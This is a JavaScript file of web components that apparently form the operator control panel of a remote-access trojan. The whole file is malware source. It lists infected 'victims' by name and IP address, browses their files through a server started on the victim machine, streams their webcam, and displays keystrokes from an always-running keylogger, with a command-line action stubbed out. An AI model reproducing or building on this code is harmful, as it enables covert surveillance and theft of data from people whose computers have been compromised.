// Reusable web components

class VictimItem extends HTMLElement {
    constructor() {
        super();
        this.handleClick = this.handleClick.bind(this);
    }

    connectedCallback() {
        const template = document.getElementById("victimItemTemplate");
        const node = document.importNode(template.content, true);

        this.appendChild(node);
        this.querySelector(".computer-name").innerHTML = this.computerName;
        this.querySelector(".ip-address").innerHTML = this.ipAddress;
        this.querySelector(".select-button").id = this.uuid;
        this.querySelector(".select-button").addEventListener("click", this.handleClick);
    }

    set uuid(uuid) {
        this.setAttribute("uuid", uuid);
    }

    get uuid() {
        return this.getAttribute("uuid");
    }

    set computerName(computerName) {
        this.setAttribute("computer-name", computerName);
    }

    get computerName() {
        return this.getAttribute("computer-name");
    }

    set ipAddress(ipAddress) {
        this.setAttribute("ip-address", ipAddress);
    }

    get ipAddress() {
        return this.getAttribute("ip-address")
    }

    handleClick(event) {
        changeSelectedVictim(event.target.id);
    }
}

customElements.define("victim-item", VictimItem);


class VictimsPanel extends HTMLElement {
    constructor() {
        super();
        // Bind method
        this.render = this.render.bind(this);
    }

    static get observedAttributes() {
        return ["victims"];
    }

    attributeChangedCallback(attrName, oldValue, newValue) {
        if ((newValue != oldValue) && (attrName === "victims")) {
            console.log(`Old Value: ${oldValue}, New value: ${newValue}`);
            this.victim = newValue;
            if (oldValue !== null)
                this.render();
        }
    }

    connectedCallback() {
        this.render();
    }

    set victims(victims) {
        this.setAttribute("victims", victims);
    }

    get victims() {
        return this.getAttribute("victims");
    }

    render() {
        // Remove child nodes between re-renders
        if (this.hasChildNodes())
            this.removeChild(this.firstElementChild);
    
        const template = document.getElementById("victimsPanelTemplate");
        const node = document.importNode(template.content, true);

        this.appendChild(node);

        const victimsListElement = this.querySelector("#victimsList");
        
        const victims = JSON.parse(this.victims);   // Convert the victim json string to an array

        if (victims.length > 0) {
            victims.forEach(victim => {
                const victimItemElement = document.createElement("victim-item");
                victimItemElement.uuid = victim.uuid;
                victimItemElement.computerName = victim.computerName;
                victimItemElement.ipAddress = victim.ipAddress;
                victimsListElement.appendChild(victimItemElement);
            });
        }
    }
}

customElements.define("victims-panel", VictimsPanel);


class CommandPanel extends HTMLElement {
    constructor() {
        super();

        // Bind methods
        this.endCurrentAction = this.endCurrentAction.bind(this);
        this.handleActionButtonClick = this.handleActionButtonClick.bind(this);
        this.render = this.render.bind(this);
    }

    static get observedAttributes() {
        return ["current-victim"];
    }

    attributeChangedCallback(attrName, oldValue, newValue) {
        if ((newValue != oldValue) && (attrName === "current-victim")) {
            console.log(`Old Value: ${oldValue}, New value: ${newValue}`);
            this.currentVictim = newValue;
            this.render();
        }
    }

    connectedCallback() {
        this.render();
    }

    disconnectedCallback() {
        this.endCurrentAction();
    }

    set currentVictim(victim) {
        this.setAttribute("current-victim", victim);
    }

    get currentVictim() {
        return this.getAttribute("current-victim");
    }

    set currentAction(currentAction) {
        this.setAttribute("current-action", currentAction);
    }

    get currentAction() {
        return this.getAttribute("current-action");
    }

    render() {
        // Remove child nodes between re-renders
        if (this.hasChildNodes())
            this.removeChild(this.firstElementChild);
    
        const template = document.getElementById("commandPanelTemplate");
        const node = document.importNode(template.content, true);
            
        this.appendChild(node);

        this.id = "commandPanel";   // Set id of element
        this.currentAction = null;

        const victim = JSON.parse(this.currentVictim || JSON.stringify({}));

        this.querySelector(".computer-name").innerHTML = victim.computerName || "";
        this.querySelector(".uuid").innerHTML = victim.uuid || "";
        this.querySelector(".ip-address").innerHTML = victim.ipAddress || "";

        // Add event listener to buttons
        this.actionButtons = this.getElementsByClassName("action-buttons");
        for (let i = 0; i < this.actionButtons.length; i++)
            this.actionButtons[i].addEventListener("click", this.handleActionButtonClick);

        // Disable File directory, Web camera, and Command Line access if the victim is not connected.
        if (victim.ipAddress == undefined) {
            this.actionButtons[0].disabled = true;
            this.actionButtons[1].disabled = true;
            this.actionButtons[3].disabled = true;
        }

        // Add event listener to Close button
        this.querySelector("#closeButton").addEventListener("click", () => {
            this.endCurrentAction();
            changeSelectedVictim(JSON.stringify({}));
        });
    }

    endCurrentAction() {
        if (this.currentAction === ACTION.FILE_DIRECTORY) {
            stopFileServer();
            this.currentAction = null;
        }else if (this.currentAction === ACTION.WEB_CAMERA) {
            stopVideoStream();
            this.currentAction = null;
        }else if (this.currentAction === ACTION.KEYSTROKES) {
            this.currentAction = null;
            return;                     // Keylogger is always running, so no need to stop it.
        }else if (this.currentAction === ACTION.COMMAND_LINE) {
            stopCommandLine();
            this.currentAction = null;
        }
    }

    handleActionButtonClick(event) {
        console.log(event.srcElement.innerText);
        const action = event.srcElement.innerText;

        //  Don't restart the current action
        if (action == this.currentAction)
            return;

        // End safety current action
        this.endCurrentAction();

        // Remove placeholder content
        const contentArea = this.querySelector("#content");
        console.log(contentArea.hasChildNodes())
        if (contentArea.hasChildNodes())
            contentArea.removeChild(contentArea.firstElementChild);

        // Start selected action
        if (action === ACTION.FILE_DIRECTORY) {
            this.currentAction = ACTION.FILE_DIRECTORY;

            // Start file server on victim computer
            startFileServer();

            const victim = JSON.parse(this.currentVictim || JSON.stringify({}));

            // Create iframe element to display file directory structure and files.
            const iframeElement = document.createElement("iframe");
            iframeElement.id = "fileDirectoryIframe";
            iframeElement.src = `http://${victim.ipAddress}:9090/`;
            contentArea.appendChild(iframeElement);
            
            // Reload iframe after 3.5 seconds
            setTimeout(() => { iframeElement.contentWindow.location.reload(); }, 6000);

        } else if (action === ACTION.WEB_CAMERA) {
            this.currentAction = ACTION.WEB_CAMERA;

            // Create img element to display each video frame and start video stream
            const imgElement = document.createElement("img");
            imgElement.id = "video_feed";
            imgElement.src = "";
            imgElement.alt = "video_feed";
            contentArea.appendChild(imgElement);
            startVideoStream();

        } else if (action === ACTION.KEYSTROKES) {
            this.currentAction = ACTION.KEYSTROKES;

            // Create table element to append each key keystroke and start collecting keystrokes from database and from victims
            const tableElement = document.createElement("table");
            tableElement.id = "keystrokes-table";
            tableElement.classList.add("shadow-lg", "bg-white");

            const tableHead = document.createElement("thead");
            const tableRow = document.createElement("tr");

            const tableThDate = document.createElement("th");
            tableThDate.innerHTML = "Date";
            tableThDate.classList.add("bg-blue-100", "border", "text-left", "px-8", "py-4");

            const tableThKey = document.createElement("th");
            tableThKey.innerHTML = "Key";
            tableThKey.classList.add("bg-blue-100", "border", "text-left", "px-8", "py-4");

            tableRow.appendChild(tableThDate);
            tableRow.appendChild(tableThKey);
            tableHead.appendChild(tableRow);
            tableElement.appendChild(tableHead);

            const tableBody = document.createElement("tbody");
            tableBody.id = "tableBody";

            tableElement.classList.add("text-black");
            tableElement.appendChild(tableBody);
            contentArea.appendChild(tableElement);

            getVictimKeystrokes(JSON.parse(this.currentVictim).uuid);   

        } else if (action === ACTION.COMMAND_LINE) {

        }

        this.currentAction = action;
    }
}

customElements.define("command-panel", CommandPanel)